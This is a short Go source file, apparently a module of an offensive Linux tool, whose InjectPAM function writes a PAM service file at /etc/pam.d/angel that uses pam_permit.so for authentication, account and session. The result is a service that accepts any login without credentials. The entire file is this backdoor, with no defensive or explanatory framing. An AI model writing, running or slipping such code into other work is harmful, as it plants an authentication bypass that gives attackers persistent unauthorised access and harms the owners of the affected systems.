package linux

import (
"os"
)

type PAMInject struct{}

func NewPAMInject() *PAMInject {
return &PAMInject{}
}

func (p *PAMInject) InjectPAM() error {
pamContent := `#%PAM-1.0
auth       required     pam_permit.so
account    required     pam_permit.so
session    required     pam_permit.so`
return os.WriteFile("/etc/pam.d/angel", []byte(pamContent), 0644)
}
